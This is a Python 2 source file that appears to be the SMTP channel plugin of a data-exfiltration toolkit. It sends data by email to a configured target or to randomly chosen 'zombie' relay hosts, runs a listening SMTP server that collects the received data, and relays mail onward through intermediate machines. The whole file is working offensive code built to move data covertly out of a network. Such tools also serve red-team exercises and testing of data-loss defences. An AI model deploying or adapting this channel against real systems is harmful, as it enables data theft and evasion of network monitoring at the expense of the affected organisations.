import smtpd
import asyncore
import email
import smtplib
from email.mime.text import MIMEText
from random import choice

config = None
app_exfiltrate = None

recipient = "recipient@example.com"
author = "author@example.com"
subject = "det:tookit"

class CustomSMTPServer(smtpd.SMTPServer):

    def process_message(self, peer, mailfrom, rcpttos, data):
        body = email.message_from_string(data).get_payload()
        app_exfiltrate.log_message('info', "[smtp] Received email "\
                "from {}".format(peer))
        try:
            self.handler(body)
        except Exception, e:
            print e
            pass

def send(data):
    if config.has_key('zombies') and config['zombies'] != [""]:
        targets = [config['target']] + config['zombies']
        target = choice(targets)
    else:
        target = config['target']
    port = config['port']
    # Create the message
    msg = MIMEText(data)
    msg['To'] = email.utils.formataddr(('Recipient', recipient))
    msg['From'] = email.utils.formataddr(('Author', author))
    msg['Subject'] = subject
    server = smtplib.SMTP(target, port)
    try:
        server.sendmail(author, [recipient], msg.as_string())
    except:
        pass
    finally:
        server.close()

def relay_email(data):
    target = config['target']
    port = config['port']
    # Create the message
    msg = MIMEText(data)
    msg['To'] = email.utils.formataddr(('Recipient', recipient))
    msg['From'] = email.utils.formataddr(('Author', author))
    msg['Subject'] = subject
    server = smtplib.SMTP(target, port)
    try:
        app_exfiltrate.log_message('info', "[zombie] [smtp] Relaying email to {}".format(target))
        server.sendmail(author, [recipient], msg.as_string())
    except:
        pass
    finally:
        server.close()

def listen():
    port = config['port']
    app_exfiltrate.log_message('info', "[smtp] Starting SMTP server on port {}".format(port))
    server = CustomSMTPServer(('', port), None)
    server.handler = app_exfiltrate.retrieve_data
    asyncore.loop()

def zombie():
    port = config['port']
    app_exfiltrate.log_message('info', "[zombie] [smtp] Starting SMTP server on port {}".format(port))
    server = CustomSMTPServer(('', port), None)
    server.handler = relay_email
    asyncore.loop()

class Plugin:

    def __init__(self, app, conf):
        global app_exfiltrate, config
        config = conf
        app_exfiltrate = app
        app.register_plugin('smtp', {'send': send, 'listen': listen, 'zombie': zombie})
